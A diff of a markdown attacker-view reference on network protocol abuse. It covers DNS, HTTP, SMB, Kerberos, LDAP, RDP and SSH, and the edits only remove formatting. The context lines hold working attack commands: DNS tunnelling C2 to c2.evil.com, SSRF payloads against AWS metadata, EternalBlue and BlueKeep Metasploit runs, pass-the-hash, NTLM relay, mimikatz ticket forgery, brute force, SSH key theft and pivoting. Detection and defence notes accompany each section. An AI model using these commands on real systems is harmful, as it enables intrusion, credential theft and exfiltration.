@@ -1,9 +1,9 @@
 # Network Protocols Security Reference
 
-> **How attackers exploit every major protocol — mechanics, TTPs, detection, and defenses.**
+> How attackers exploit every major protocol — mechanics, TTPs, detection, and defenses.
 > ATT&CK technique IDs are noted throughout. All tool commands are for authorized use only.
 >
-> **Pairs with** [NETWORK_PROTOCOLS_REFERENCE.md](NETWORK_PROTOCOLS_REFERENCE.md) — the engineering/defender companion: protocol internals, hardening configs (Cisco IOS / sshd_config), the TLS/OAuth/SAML chapters, OT-ICS / VoIP / MQTT coverage, and the packet-analysis tooling chapter (Wireshark, tshark, Zeek). This file is the attacker view; that one is the engineering view.
+> Pairs with [NETWORK_PROTOCOLS_REFERENCE.md](NETWORK_PROTOCOLS_REFERENCE.md) — the engineering/defender companion: protocol internals, hardening configs (Cisco IOS / sshd_config), the TLS/OAuth/SAML chapters, OT-ICS / VoIP / MQTT coverage, and the packet-analysis tooling chapter (Wireshark, tshark, Zeek). This file is the attacker view; that one is the engineering view.
 
 ---
 
@@ -31,10 +31,10 @@
 
 DNS is the internet's distributed naming system. Resolution follows a hierarchical chain:
 
-1. Client queries its configured **recursive resolver** (typically ISP or enterprise DNS).
-2. Resolver queries a **root name server** (13 root server clusters, anycast).
-3. Root server refers to the appropriate **TLD name server** (`.com`, `.net`, etc.).
-4. TLD name server refers to the **authoritative name server** for the domain.
+1. Client queries its configured recursive resolver (typically ISP or enterprise DNS).
+2. Resolver queries a root name server (13 root server clusters, anycast).
+3. Root server refers to the appropriate TLD name server (`.com`, `.net`, etc.).
+4. TLD name server refers to the authoritative name server for the domain.
 5. Authoritative server returns the record; resolver caches it per the TTL.
 
 Common record types: `A` (IPv4), `AAAA` (IPv6), `MX` (mail), `CNAME` (alias), `NS` (name server), `TXT` (SPF/DKIM/etc.), `PTR` (reverse), `SRV` (service location), `ANY` (all records — now largely deprecated per RFC 8482).
@@ -43,11 +43,11 @@ UDP is used for queries ≤512 bytes; TCP is used for zone transfers (AXFR) and 
 
 ### Attack Techniques
 
-#### DNS Tunneling — T1071.004, T1048.003
+#### DNS Tunneling: T1071.004, T1048.003
 
 Attackers encode data in DNS query/response payloads to exfiltrate data or maintain C2 through firewalls that permit DNS.
 
-**iodine** (IP-over-DNS tunnel):
+iodine (IP-over-DNS tunnel):
 ```bash
 # Attacker controls ns1.evil.com pointing to their server
 # Server side
@@ -58,7 +58,7 @@ iodine -f -P s3cr3t tunnel.evil.com
 # Creates tun0 interface; SSH over it: ssh user@10.0.0.2
 ```
 
-**dnscat2** (encrypted C2 over DNS):
+dnscat2 (encrypted C2 over DNS):
 ```bash
 # Server
 ruby dnscat2.rb --dns "domain=c2.evil.com,host=0.0.0.0" --no-cache --security=open
@@ -70,7 +70,7 @@ Start-Dnscat2 -Domain c2.evil.com -DNSServer 8.8.8.8
 
 Detection indicators: high query rate to single domain, labels >40 characters (legitimate labels average <15), base32/base64 character sets in labels, low TTL values, uncommon record types (NULL, TXT for C2), queries out of proportion to web traffic.
 
-#### DNS Amplification — T1498.002
+#### DNS Amplification: T1498.002
 
 Exploit misconfigured resolvers to amplify DDoS traffic. An `ANY` or `DNSKEY` query of ~40 bytes can return 3,000+ bytes — 70x amplification. Combined with source IP spoofing (BCP38 violations), this floods victims.
 
@@ -84,17 +84,17 @@ dig +short @<resolver-ip> DNSKEY . | wc -c
 
 BCP38 (RFC 2827) network ingress filtering prevents IP spoofing at the ISP level and is the primary mitigation.
 
-#### DNS Hijacking — T1584.002, T1071.004
+#### DNS Hijacking: T1584.002, T1071.004
 
 Attackers compromise DNS registrar accounts, hosting provider DNS panels, or on-path resolvers to redirect traffic. Common vector: credential stuffing or phishing registrar accounts.
 
-#### DNS Rebinding — T1557
+#### DNS Rebinding: T1557
 
 Attacker controls a domain with very low TTL. Initial resolution returns a public IP (passes same-origin policy check); subsequent resolution returns an internal IP (e.g., `192.168.1.1`). Browser scripts then reach internal hosts using the victim's credentials.
 
 Mitigation: DNS rebinding protection in resolvers (reject private IPs for public domains), `--dns-rebind-localhost-only` in dnsmasq.
 
-#### Subdomain Takeover — T1584.001
+#### Subdomain Takeover: T1584.001
 
 CNAME records pointing to deprovisioned cloud services (AWS S3, Azure App Service, GitHub Pages, Heroku) can be claimed by attackers who register the same service name.
 
@@ -119,13 +119,13 @@ Tools: `subjack`, `nuclei -t takeovers/`, `can-i-take-over-xyz` GitHub project.
 
 ### Defensive Controls
 
-- **Response Policy Zones (RPZ)**: Block malicious domains at the recursive resolver.
-- **DNS Filtering**: Cisco Umbrella, Cloudflare Gateway, Quad9 — block C2 domains by category.
-- **DNSSEC**: Cryptographically signs zone data; prevents cache poisoning (Kaminsky attack). Deploy on authoritative zones; validate on resolvers.
-- **DoH/DoT**: DNS-over-HTTPS (port 443) and DNS-over-TLS (port 853) encrypt DNS queries to prevent on-path inspection and manipulation.
-- **Disable open recursion**: Resolvers should only answer queries from authorized clients.
-- **Monitor for zone transfer attempts**: Restrict AXFR to authorized secondary servers only.
-- **Registrar 2FA + registry lock**: Prevent unauthorized domain hijacking.
+- Response Policy Zones (RPZ): Block malicious domains at the recursive resolver.
+- DNS Filtering: Cisco Umbrella, Cloudflare Gateway, Quad9: block C2 domains by category.
+- DNSSEC: Cryptographically signs zone data; prevents cache poisoning (Kaminsky attack). Deploy on authoritative zones; validate on resolvers.
+- DoH/DoT: DNS-over-HTTPS (port 443) and DNS-over-TLS (port 853) encrypt DNS queries to prevent on-path inspection and manipulation.
+- Disable open recursion: Resolvers should only answer queries from authorized clients.
+- Monitor for zone transfer attempts: Restrict AXFR to authorized secondary servers only.
+- Registrar 2FA + registry lock: Prevent unauthorized domain hijacking.
 
 ---
 
@@ -149,13 +149,13 @@ Server: HTTP/1.1 200 OK
         <body>
 ```
 
-**HTTP/2** (RFC 7540) introduces binary framing, multiplexing multiple streams over a single TCP connection, header compression (HPACK), and server push. **HTTP/3** runs over QUIC (UDP).
+HTTP/2 (RFC 7540) introduces binary framing, multiplexing multiple streams over a single TCP connection, header compression (HPACK), and server push. HTTP/3 runs over QUIC (UDP).
 
 HTTPS wraps HTTP in TLS. TLS 1.3 (RFC 8446) is current — mandatory forward secrecy, 0-RTT resumption, encrypted handshake.
 
 ### Attack Techniques
 
-#### Server-Side Request Forgery (SSRF) — T1090, T1552.005
+#### Server-Side Request Forgery (SSRF): T1090, T1552.005
 
 SSRF tricks the server into making requests to internal resources on behalf of the attacker. High-impact target: AWS Instance Metadata Service (IMDS).
 
@@ -177,11 +177,11 @@ http://169.254.169.254.xip.io/   # DNS rebind bypass
 
 IMDSv2 (token-based, PUT-first) mitigates most SSRF against AWS IMDS by requiring a session-oriented token.
 
-#### HTTP Request Smuggling — T1190
+#### HTTP Request Smuggling: T1190
 
 Exploits disagreement between front-end (load balancer/CDN) and back-end servers about where one HTTP request ends and the next begins. Two main variants:
 
-**CL.TE** (front-end uses Content-Length, back-end uses Transfer-Encoding):
+CL.TE (front-end uses Content-Length, back-end uses Transfer-Encoding):
 ```
 POST / HTTP/1.1
 Host: target.com
@@ -193,7 +193,7 @@ Transfer-Encoding: chunked
 SMUGGLED
 ```
 
-**TE.CL** (front-end uses Transfer-Encoding, back-end uses Content-Length):
+TE.CL (front-end uses Transfer-Encoding, back-end uses Content-Length):
 ```
 POST / HTTP/1.1
 Host: target.com
@@ -208,7 +208,7 @@ SMUGGLED
 
 Tools: Burp Suite HTTP Request Smuggler extension, `smuggler.py`. Impact includes bypassing security controls, hijacking user sessions, and cache poisoning.
 
-#### HTTP/2 CONTINUATION Flood — CVE-2024-27316, T1498.002
+#### HTTP/2 CONTINUATION Flood: CVE-2024-27316, T1498.002
 
 Rapid7 / CERT/CC disclosed in April 2024 that many HTTP/2 implementations fail to limit CONTINUATION frames (used to extend HEADERS). Sending a stream of CONTINUATION frames without END_HEADERS flag forces servers to buffer indefinitely, causing OOM or CPU exhaustion with a single TCP connection.
 
@@ -216,7 +216,7 @@ Affected: Apache httpd, nginx (certain configs), Node.js, Go net/http, Envoy —
 
 Detection: Unusual spike in HTTP/2 CONTINUATION frames per connection, server memory exhaustion, absence of END_HEADERS flag in extended frame sequences.
 
-#### Domain Fronting — T1090.004
+#### Domain Fronting: T1090.004
 
 Uses a CDN (Cloudflare, AWS CloudFront, Azure CDN) where the TLS SNI contains the allowed domain but the HTTP `Host` header contains the actual C2 domain. The CDN routes based on `Host`, not SNI.
 
@@ -227,7 +227,7 @@ HTTP Host header: c2-server.cloudfront.net
 
 Most major CDN providers now block domain fronting. Detection: mismatch between SNI and `Host` header at SSL inspection proxies.
 
-#### Slowloris — T1498.001
+#### Slowloris: T1498.001
 
 Keeps many connections open by sending partial HTTP requests, never completing them. Exhausts the server's connection pool.
 
@@ -250,13 +250,13 @@ Mitigation: Reverse proxy (nginx/HAProxy), `RequestReadTimeout` in Apache, rate-
 
 ### Defensive Controls
 
-- **Web Application Firewall (WAF)**: AWS WAF, ModSecurity, Cloudflare WAF — block SSRF patterns, SQLi, XSS.
-- **IMDSv2**: Require token-based metadata access on all EC2 instances.
-- **Normalize HTTP parsing**: Use consistent front-end and back-end parsers; reject ambiguous `Content-Length`/`Transfer-Encoding` combinations.
-- **Patch HTTP/2 implementations**: Keep server software current for CVE-2024-27316 and similar.
-- **Connection/request timeouts**: `client_header_timeout`, `client_body_timeout` in nginx; `RequestReadTimeout` in Apache.
-- **Input validation for URLs**: Allowlist internal-facing URL schemes; block private IP ranges in SSRF-prone parameters.
-- **TLS inspection at proxy**: Detect domain fronting via SNI/Host mismatch.
+- Web Application Firewall (WAF): AWS WAF, ModSecurity, Cloudflare WAF: block SSRF patterns, SQLi, XSS.
+- IMDSv2: Require token-based metadata access on all EC2 instances.
+- Normalize HTTP parsing: Use consistent front-end and back-end parsers; reject ambiguous `Content-Length`/`Transfer-Encoding` combinations.
+- Patch HTTP/2 implementations: Keep server software current for CVE-2024-27316 and similar.
+- Connection/request timeouts: `client_header_timeout`, `client_body_timeout` in nginx; `RequestReadTimeout` in Apache.
+- Input validation for URLs: Allowlist internal-facing URL schemes; block private IP ranges in SSRF-prone parameters.
+- TLS inspection at proxy: Detect domain fronting via SNI/Host mismatch.
 
 ---
 
@@ -277,7 +277,7 @@ SMBv3 encryption: `Encrypt-Data` parameter in `Set-SmbServerConfiguration`. SMB 
 
 ### Attack Techniques
 
-#### EternalBlue — MS17-010, CVE-2017-0144, T1210
+#### EternalBlue: MS17-010, CVE-2017-0144, T1210
 
 A buffer overflow in SMBv1's transaction processing. Exploited by NSA's ETERNALBLUE, leaked by Shadow Brokers in April 2017. Used by WannaCry and NotPetya.
 
@@ -292,7 +292,7 @@ run
 
 Impact: Remote code execution as SYSTEM without authentication. Patch: MS17-010 (April 2017). All unpatched systems remain vulnerable.
 
-#### Pass-the-Hash — T1550.002
+#### Pass-the-Hash: T1550.002
 
 NTLM authentication accepts the NT hash directly without knowing the plaintext password. Attackers extract hashes from LSASS memory and authenticate as the user.
 
@@ -310,7 +310,7 @@ crackmapexec smb 192.168.1.0/24 -u Administrator -H 8846f7eaee8fb117ad06bdd830b7
 
 Detection: Event ID 4624 (Logon Type 3, NTLM), anonymous or machine account SMB auth, lateral movement patterns.
 
-#### NTLM Relay — T1557.001
+#### NTLM Relay: T1557.001
 
 Capture NTLM authentication challenges and relay them to another service that accepts NTLM. Does not require cracking the hash.
 
@@ -330,7 +330,7 @@ python3 PetitPotam.py -u user -p pass attacker-ip dc-ip
 
 Mitigation: SMB signing (required on all hosts), disable NTLM authentication, enable LDAP signing + channel binding.
 
-#### SMB Brute Force — T1110.001
+#### SMB Brute Force: T1110.001
 
 ```bash
 crackmapexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce
@@ -339,7 +339,7 @@ hydra -L users.txt -P passwords.txt smb://192.168.1.100
 
 Detection: Event ID 4625 (failed logon) spike, Event ID 4740 (account lockout), rapid Type 3 logon failures.
 
-#### Share Enumeration — T1135
+#### Share Enumeration: T1135
 
 ```bash
 # Enumerate shares (null session or authenticated)
@@ -367,13 +367,13 @@ Network indicators: SMB traffic from workstation-to-workstation (east-west), por
 
 ### Defensive Controls
 
-- **Disable SMBv1**: `Set-SmbServerConfiguration -EnableSMB1Protocol $false` — eliminates EternalBlue attack surface.
-- **Require SMB signing**: `Set-SmbServerConfiguration -RequireSecuritySignature $true` — prevents NTLM relay.
-- **Block TCP 445 at perimeter**: No SMB should reach the internet.
-- **Firewall east-west**: Workstations should not reach each other on 445; only file servers.
-- **Disable NTLM** (or restrict to NTLMv2): Group Policy `Network Security: LAN Manager authentication level` = `Send NTLMv2 response only. Refuse LM & NTLM`.
-- **LAPS**: Local Administrator Password Solution randomizes local admin passwords, preventing lateral movement via shared credentials.
-- **Credential Guard**: Protects LSASS-stored credentials from extraction.
+- Disable SMBv1: `Set-SmbServerConfiguration -EnableSMB1Protocol $false`: eliminates EternalBlue attack surface.
+- Require SMB signing: `Set-SmbServerConfiguration -RequireSecuritySignature $true`: prevents NTLM relay.
+- Block TCP 445 at perimeter: No SMB should reach the internet.
+- Firewall east-west: Workstations should not reach each other on 445; only file servers.
+- Disable NTLM (or restrict to NTLMv2): Group Policy `Network Security: LAN Manager authentication level` = `Send NTLMv2 response only. Refuse LM & NTLM`.
+- LAPS: Local Administrator Password Solution randomizes local admin passwords, preventing lateral movement via shared credentials.
+- Credential Guard: Protects LSASS-stored credentials from extraction.
 
 ---
 
@@ -406,7 +406,7 @@ Tickets: TGT is valid 10 hours (default), renewable for 7 days. Service tickets 
 
 ### Attack Techniques
 
-#### Kerberoasting — T1558.003
+#### Kerberoasting: T1558.003
 
 Any authenticated domain user can request service tickets for accounts with SPNs. Tickets are encrypted with the service account's NT hash. Attackers crack offline.
 
@@ -420,11 +420,11 @@ hashcat -m 13100 kerberoast_hashes.txt rockyou.txt --force
 john --format=krb5tgs kerberoast_hashes.txt --wordlist=rockyou.txt
 ```
 
-Detection: **Event ID 4769** (Kerberos Service Ticket Request) with Encryption Type `0x17` (RC4-HMAC) or `0x18` from a user account (not computer), especially outside business hours or for many different SPNs.
+Detection: Event ID 4769 (Kerberos Service Ticket Request) with Encryption Type `0x17` (RC4-HMAC) or `0x18` from a user account (not computer), especially outside business hours or for many different SPNs.
 
 Mitigation: Use AES encryption for service accounts; deploy gMSA (Group Managed Service Accounts) with 240-character auto-rotated passwords (infeasible to crack).
 
-#### AS-REP Roasting — T1558.004
+#### AS-REP Roasting: T1558.004
 
 Accounts with "Do not require Kerberos preauthentication" set allow an unauthenticated attacker to request AS-REP; the response contains material encrypted with the user's hash.
 
@@ -436,11 +436,11 @@ impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.1 -no-pass
 hashcat -m 18200 asrep_hashes.txt rockyou.txt
 ```
 
-Detection: **Event ID 4768** (TGT Request) with Preauthentication Type `0` (no preauth) and Result Code `0x0` (success).
+Detection: Event ID 4768 (TGT Request) with Preauthentication Type `0` (no preauth) and Result Code `0x0` (success).
 
-#### Golden Ticket — T1558.001
+#### Golden Ticket: T1558.001
 
-Forge a TGT using the **krbtgt** account hash (obtained via DCSync or NTDS.dit). The KDC trusts any properly signed TGT without further verification.
+Forge a TGT using the krbtgt account hash (obtained via DCSync or NTDS.dit). The KDC trusts any properly signed TGT without further verification.
 
 ```bash
 # Get krbtgt hash (requires Domain Admin)
@@ -456,11 +456,11 @@ mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
 mimikatz # kerberos::ptt golden.kirbi
 ```
 
-Golden Tickets can be set with 20-year validity. Detection: Tickets with anomalous validity periods (>10 hours), **Event ID 4769** requesting service tickets with a non-existent user, tickets with mismatched PAC data. Mitigation: Rotate krbtgt password twice (invalidates all outstanding tickets).
+Golden Tickets can be set with 20-year validity. Detection: Tickets with anomalous validity periods (>10 hours), Event ID 4769 requesting service tickets with a non-existent user, tickets with mismatched PAC data. Mitigation: Rotate krbtgt password twice (invalidates all outstanding tickets).
 
-#### Silver Ticket — T1558.002
+#### Silver Ticket: T1558.002
 
-Forge a service ticket using the **service account hash** (no KDC contact). More stealthy than Golden Ticket — no authentication events at the DC.
+Forge a service ticket using the service account hash (no KDC contact). More stealthy than Golden Ticket — no authentication events at the DC.
 
 ```bash
 mimikatz # kerberos::silver /user:Administrator /domain:corp.local \
@@ -470,7 +470,7 @@ mimikatz # kerberos::silver /user:Administrator /domain:corp.local \
 
 Detection: Service ticket usage without a preceding TGS-REQ at the DC; PAC validation errors.
 
-#### Pass-the-Ticket — T1550.003
+#### Pass-the-Ticket: T1550.003
 
 Inject a harvested Kerberos ticket into the current session.
 
@@ -485,9 +485,9 @@ mimikatz # kerberos::ptt ticket.kirbi
 Rubeus.exe ptt /ticket:base64blob
 ```
 
-Detection: **Event ID 4648** (logon with explicit credentials), unusual TGT usage from unexpected source hosts.
+Detection: Event ID 4648 (logon with explicit credentials), unusual TGT usage from unexpected source hosts.
 
-#### Overpass-the-Hash — T1550.002
+#### Overpass-the-Hash: T1550.002
 
 Convert an NT hash into a Kerberos TGT to avoid NTLM network logons (which are more detectable).
 
@@ -509,13 +509,13 @@ mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local \
 
 ### Defensive Controls
 
-- **Enforce AES encryption**: Disable RC4 (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters\SupportedEncryptionTypes = 0x18`); makes Kerberoasting infeasible.
-- **gMSA (Group Managed Service Accounts)**: Auto-rotate 240-char passwords; removes Kerberoasting viability for service accounts.
-- **FAST / Kerberos Armoring**: Wraps AS-REQ in a TGT, preventing AS-REP Roasting without armoring.
-- **Rotate krbtgt**: Perform planned double-rotation to invalidate Golden Tickets; use Microsoft's `New-KrbtgtKeys.ps1`.
-- **Protected Users security group**: Forces AES; disallows credential caching; TGT non-renewable.
-- **Privileged Access Workstations (PAW)**: Isolate admin Kerberos tickets from internet-facing sessions.
-- **BloodHound / attack path analysis**: Identify and sever shortest paths to Domain Admin.
+- Enforce AES encryption: Disable RC4 (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters\SupportedEncryptionTypes = 0x18`); makes Kerberoasting infeasible.
+- gMSA (Group Managed Service Accounts): Auto-rotate 240-char passwords; removes Kerberoasting viability for service accounts.
+- FAST / Kerberos Armoring: Wraps AS-REQ in a TGT, preventing AS-REP Roasting without armoring.
+- Rotate krbtgt: Perform planned double-rotation to invalidate Golden Tickets; use Microsoft's `New-KrbtgtKeys.ps1`.
+- Protected Users security group: Forces AES; disallows credential caching; TGT non-renewable.
+- Privileged Access Workstations (PAW): Isolate admin Kerberos tickets from internet-facing sessions.
+- BloodHound / attack path analysis: Identify and sever shortest paths to Domain Admin.
 
 ---
 
@@ -526,18 +526,18 @@ mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local \
 LDAP (Lightweight Directory Access Protocol) is the wire protocol for X.500 directory services (Active Directory, OpenLDAP). LDAPS is LDAP over TLS on port 636.
 
 Core operations:
-- **Bind**: Authenticate (simple bind = cleartext credentials; SASL = Kerberos/NTLM).
-- **Search**: Query the directory tree (`(objectClass=user)`, `(sAMAccountName=john)`).
-- **Add/Modify/Delete**: Modify directory objects (requires permissions).
-- **Compare**: Test attribute values.
-- **Abandon**: Cancel a pending operation.
-- **Extended**: LDAP-over-TLS StartTLS, Password Modify.
+- Bind: Authenticate (simple bind = cleartext credentials; SASL = Kerberos/NTLM).
+- Search: Query the directory tree (`(objectClass=user)`, `(sAMAccountName=john)`).
+- Add/Modify/Delete: Modify directory objects (requires permissions).
+- Compare: Test attribute values.
+- Abandon: Cancel a pending operation.
+- Extended: LDAP-over-TLS StartTLS, Password Modify.
 
 LDAP search components: BaseDN, scope (base/onelevel/subtree), filter, attributes to return.
 
 ### Attack Techniques
 
-#### LDAP Injection — T1190, T1055
+#### LDAP Injection: T1190, T1055
 
 Unsanitized user input in LDAP query filters allows logic manipulation:
 
@@ -553,7 +553,7 @@ Username: *)(|(objectClass=*
 
 Mitigation: Escape special characters (`*`, `(`, `)`, `\`, `NUL`) in LDAP filters using RFC 4515 escaping.
 
-#### Anonymous Bind Enumeration — T1087.002, T1069.002
+#### Anonymous Bind Enumeration: T1087.002, T1069.002
 
 Many older AD configurations permit unauthenticated LDAP queries. Attackers enumerate users, groups, computers, GPOs, and password policies.
 
@@ -574,7 +574,7 @@ ldapsearch -H ldap://10.0.0.1 -x -b "DC=corp,DC=local" \
   "(objectClass=domainDNS)" minPwdLength lockoutThreshold
 ```
 
-#### ldapdomaindump — T1087.002
+#### ldapdomaindump: T1087.002
 
 Python tool for comprehensive AD enumeration over LDAP:
 
@@ -583,7 +583,7 @@ ldapdomaindump -u 'corp.local\user' -p 'password' 10.0.0.1 -o /tmp/ad_dump/
 # Outputs HTML/JSON: domain_users, domain_groups, domain_computers, domain_trusts
 ```
 
-#### LDAP Relay to Active Directory — T1557.001
+#### LDAP Relay to Active Directory: T1557.001
 
 Similar to NTLM relay but targeting LDAP. Used to add users to privileged groups, configure Resource-Based Constrained Delegation (RBCD), or modify ACLs.
 
@@ -603,16 +603,16 @@ Requires: LDAP signing not enforced + LDAP channel binding not required.
 | ldapdomaindump | Network traffic | Rapid sequential LDAP queries for all object classes |
 | LDAP relay | Event 4662 (object access) | Unexpected group membership changes, ACL modifications |
 
-Enable **Event ID 2889** (unsigned LDAP bind) via `Domain Controller Diagnostic` registry key.
+Enable Event ID 2889 (unsigned LDAP bind) via `Domain Controller Diagnostic` registry key.
 
 ### Defensive Controls
 
-- **Require LDAP signing**: Group Policy `Domain Controller: LDAP server signing requirements = Require Signing`.
-- **Enable LDAP Channel Binding**: Prevents relay attacks; required for CBS patches.
-- **Disable anonymous bind**: Default in modern AD but verify; `dsHeuristics` bit 7.
-- **Restrict LDAP to management networks**: Firewall port 389/636 from general user VLANs.
-- **Minimum permissions**: Service accounts should not have write access to AD objects.
-- **Monitor for wildcard LDAP searches**: Alert on `(objectClass=*)` or large result sets from non-server sources.
+- Require LDAP signing: Group Policy `Domain Controller: LDAP server signing requirements = Require Signing`.
+- Enable LDAP Channel Binding: Prevents relay attacks; required for CBS patches.
+- Disable anonymous bind: Default in modern AD but verify; `dsHeuristics` bit 7.
+- Restrict LDAP to management networks: Firewall port 389/636 from general user VLANs.
+- Minimum permissions: Service accounts should not have write access to AD objects.
+- Monitor for wildcard LDAP searches: Alert on `(objectClass=*)` or large result sets from non-server sources.
 
 ---
 
@@ -622,13 +622,13 @@ Enable **Event ID 2889** (unsigned LDAP bind) via `Domain Controller Diagnostic`
 
 Remote Desktop Protocol provides remote GUI access. Architecture includes virtual channels for audio, clipboard, printer redirection, and smart card. Key components:
 
-- **NLA (Network Level Authentication)**: Preauthenticates before establishing full RDP session; requires valid credentials before resource allocation (mitigates unauthenticated exploits).
-- **CredSSP**: Delegates credentials to the remote server (used by NLA).
-- **Virtual Channels**: Dynamic bidirectional data streams; extensible (e.g., RDP clipboard = `cliprdr`).
+- NLA (Network Level Authentication): Preauthenticates before establishing full RDP session; requires valid credentials before resource allocation (mitigates unauthenticated exploits).
+- CredSSP: Delegates credentials to the remote server (used by NLA).
+- Virtual Channels: Dynamic bidirectional data streams; extensible (e.g., RDP clipboard = `cliprdr`).
 
 ### Attack Techniques
 
-#### BlueKeep — CVE-2019-0708, T1210
+#### BlueKeep: CVE-2019-0708, T1210
 
 Pre-authentication use-after-free vulnerability in the RDP pre-authentication channel (`MS_T120`). Allows remote code execution without credentials on Windows 7/Server 2008 (NLA disabled).
 
@@ -640,11 +640,11 @@ set TARGET 2   # Windows 7 SP1 x64 / 2008 R2 x64
 run
 ```
 
-#### DejaBlue — CVE-2019-1181/1182, T1210
+#### DejaBlue: CVE-2019-1181/1182, T1210
 
 Similar pre-auth heap overflow in Remote Desktop Services affecting Windows 8, 10, Server 2012-2019. Patched August 2019. Both BlueKeep and DejaBlue are wormable.
 
-#### RDP Brute Force — T1110.001
+#### RDP Brute Force: T1110.001
 
 ```bash
 crowbar -b rdp -s 192.168.1.100/32 -u Administrator -C passwords.txt -n 1
@@ -654,7 +654,7 @@ ncrack -vv --user Administrator -P passwords.txt rdp://192.168.1.100
 
 Detection: Event ID 4625 spikes from external IPs on port 3389, Event 4771 (Kerberos pre-auth failure).
 
-#### RDP Session Hijacking — T1563.002
+#### RDP Session Hijacking: T1563.002
 
 An attacker with SYSTEM privileges can hijack any RDP session — including disconnected ones — without knowing the user's password:
 
@@ -672,7 +672,7 @@ Windows does not prompt the hijacked user; the session is silently taken over.
 
 Detection: Event ID 4778 (session reconnected), anomalous session reconnects, `tscon.exe` process creation.
 
-#### Pass-the-Hash with Restricted Admin Mode — T1550.002
+#### Pass-the-Hash with Restricted Admin Mode: T1550.002
 
 Windows Server 2012 R2+ "Restricted Admin Mode" (`/restrictedadmin` flag in `mstsc.exe`) allows connecting with an NT hash instead of a password. This was intended to prevent credential forwarding but introduced Pass-the-Hash.
 
@@ -698,13 +698,13 @@ Network: Port 3389 connections from internet-facing IPs; multiple failed auth at
 
 ### Defensive Controls
 
-- **Require NLA**: `Computer Configuration > Administrative Templates > Windows Components > Remote Desktop Services > Require NLA`.
-- **MFA for RDP**: Microsoft Entra multifactor authentication (formerly Azure AD MFA), Duo RDP Gateway, YubiKey smart card.
-- **Restrict source IPs**: Firewall allow-list; only RDP Gateway or bastion host should reach 3389.
-- **RDP Gateway**: Centralize RDP access through an RDP Gateway (formerly TS Gateway) that enforces policies.
-- **Disable Restricted Admin Mode**: `HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 1`.
-- **Patch**: Deploy BlueKeep (MS19-0708) and DejaBlue patches; critical priority.
-- **Account lockout**: Prevent brute force; 5 failures = 30-minute lockout.
+- Require NLA: `Computer Configuration > Administrative Templates > Windows Components > Remote Desktop Services > Require NLA`.
+- MFA for RDP: Microsoft Entra multifactor authentication (formerly Azure AD MFA), Duo RDP Gateway, YubiKey smart card.
+- Restrict source IPs: Firewall allow-list; only RDP Gateway or bastion host should reach 3389.
+- RDP Gateway: Centralize RDP access through an RDP Gateway (formerly TS Gateway) that enforces policies.
+- Disable Restricted Admin Mode: `HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 1`.
+- Patch: Deploy BlueKeep (MS19-0708) and DejaBlue patches; critical priority.
+- Account lockout: Prevent brute force; 5 failures = 30-minute lockout.
 
 ---
 
@@ -714,18 +714,18 @@ Network: Port 3389 connections from internet-facing IPs; multiple failed auth at
 
 SSH (Secure Shell) provides encrypted remote shell access, file transfer (SFTP/SCP), and port forwarding. Protocol flow:
 
-1. **TCP connect** on port 22.
-2. **Version string exchange** (`SSH-2.0-OpenSSH_9.0`).
-3. **Key exchange** (ECDH / Diffie-Hellman): Establishes session encryption keys.
-4. **Host key verification**: Client checks server's public key against `~/.ssh/known_hosts`.
-5. **User authentication**: Password, public key (`authorized_keys`), GSSAPI (Kerberos), or FIDO2.
-6. **Channel multiplex**: Multiple logical channels (shell, exec, sftp, direct-tcpip for port forwards) over one connection.
+1. TCP connect on port 22.
+2. Version string exchange (`SSH-2.0-OpenSSH_9.0`).
+3. Key exchange (ECDH / Diffie-Hellman): Establishes session encryption keys.
+4. Host key verification: Client checks server's public key against `~/.ssh/known_hosts`.
+5. User authentication: Password, public key (`authorized_keys`), GSSAPI (Kerberos), or FIDO2.
+6. Channel multiplex: Multiple logical channels (shell, exec, sftp, direct-tcpip for port forwards) over one connection.
 
 SSH agent (`ssh-agent`) caches decrypted private keys in memory, forwarded via a Unix socket.
 
 ### Attack Techniques
 
-#### Credential Brute Force — T1110.001
+#### Credential Brute Force: T1110.001
 
 ```bash
 hydra -l root -P rockyou.txt ssh://192.168.1.100
@@ -735,7 +735,7 @@ nmap --script ssh-brute -p 22 192.168.1.100
 
 Detection: Auth log repeated "Failed password" or "Invalid user" entries; `fail2ban` or SIEM alert on >10 failures/minute.
 
-#### SSH Private Key Theft — T1552.004
+#### SSH Private Key Theft: T1552.004
 
 ```bash
 # Common key locations
@@ -757,7 +757,7 @@ cat /root/.ssh/id_rsa
 openssl rsa -in id_rsa -check -noout 2>&1 | grep -q "ok" && echo "No passphrase"
 ```
 
-#### SSH Agent Hijacking — T1563.001
+#### SSH Agent Hijacking: T1563.001
 
 If an admin connects to a compromised host with agent forwarding (`-A`), an attacker with root can steal the agent socket and authenticate as the admin to other hosts.
 
@@ -776,7 +776,7 @@ Detection: Unexpected `ssh-agent` forwarding to server hosts; `SSH_AUTH_SOCK` en
 
 Mitigation: `ForwardAgent no` in server `sshd_config`; FIDO2/hardware keys (cannot be forwarded).
 
-#### SSH Tunneling for Pivoting — T1572, T1090.001
+#### SSH Tunneling for Pivoting: T1572, T1090.001
 
 SSH provides built-in tunneling capabilities for network pivoting:
 
@@ -801,14 +801,14 @@ Detection: Unusual port bindings, `ssh -D` / `-L` / `-R` flags in process comman
 
 ### Defensive Controls
 
-- **Public key authentication only**: Disable password auth in `sshd_config`: `PasswordAuthentication no`, `ChallengeResponseAuthentication no`.
-- **FIDO2/hardware keys**: `AuthorizedKeysFile` with `sk-` key types; keys cannot be exported or forwarded.
-- **Disable agent forwarding on servers**: `AllowAgentForwarding no` in `sshd_config`.
-- **Rotate keys regularly**: Audit `~/.ssh/authorized_keys` across all hosts; remove stale keys.
-- **Bastion host / Jump server**: Restrict direct SSH; all access routes through centrally-logged bastion.
-- **Port knocking or VPN**: Reduce port 22 exposure to the internet entirely.
-- **Centralized key management**: HashiCorp Vault SSH secrets engine, AWS Systems Manager Session Manager (no port 22 needed).
-- **SSH certificate authority**: Issue short-lived SSH certificates instead of long-lived authorized_keys entries.
+- Public key authentication only: Disable password auth in `sshd_config`: `PasswordAuthentication no`, `ChallengeResponseAuthentication no`.
